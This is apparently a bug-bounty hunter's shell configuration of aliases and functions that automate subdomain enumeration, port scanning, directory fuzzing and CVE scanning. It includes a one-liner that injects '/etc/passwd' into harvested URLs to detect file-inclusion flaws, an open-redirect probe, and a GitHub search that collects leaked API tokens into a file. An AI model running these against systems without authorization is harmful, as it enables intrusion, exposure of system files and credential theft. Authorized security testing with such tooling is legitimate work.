alias vpnip="ifconfig | grep "destination" | awk {print$2} | cut -c9-$p"
alias serve="sudo python3 -m http.server 80"

githound(){
echo "$1" | git-hound --dig-files --dig-commits --many-results | tee -a api_tokens.txt
}

lfi(){
gau -subs $1 | gf lfi | qsreplace "/etc/passwd" | xargs -I % -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'
}


open-redirect(){
local LHOST="http://example.com"; gau -subs $1 | gf redirect | qsreplace "$LHOST" | xargs -I % -P 25 sh -c 'curl -Is "%" 2>&1 | grep -q "Location: $LHOST" && echo "VULN! %"'
}

enum(){
    mkdir $1
    cd $1
    assetfinder -subs-only "$1" | tee -a domains
    findomain -t "$1" --unique-output findomain.txt && cat findomain.txt | tee -a domains
    sublist3r -d $1 -o sublist3r.txt && cat sublist3r.txt | tee -a domains
    amass enum -brute -active --passive -d "$1" -config ~/.config/amass/config.ini | tee -a domains
    subfinder -silent -d "$1" | tee -a domains
    cat domains | anew domains.txt
    rm domains
    cat domains.txt | httpx -silent | tee -a hosts.txt
    # echo "$1" | git-hound --config-file '/home/piyush/.githound/config.yml' | tee -a git_hound.txt
    kr scan hosts.txt -A=apiroutes-210228:20000 -x 10 --ignore-length=34 | tee -a kr_scan.txt
    cat domains.txt | aquatone -out screens -scan-timeout 200 -screenshot-timeout 60000 -ports xlarge
    naabu -silent -top-ports 1000 -l domains.txt | tee -a portscan.txt
    subjack -w domains.txt -t 100 -timeout 20 -o subjack_out.txt --ssl -c /src/github.com/haccer/subjack/fingerprints.json
    nuclei -l hosts.txt -t ~/nuclei-templates/cves -me cve_reports
    for i in $(cat hosts.txt); do ffuf -u $i/FUZZ -w ~/Documents/bugbounty/wordlist/dirs.txt -ac -r -v -c -o ffuf.txt;done
    cd ..
}

jaeles(){
    jaeles scan -s ~/.jaeles/ -U hosts.txt
}
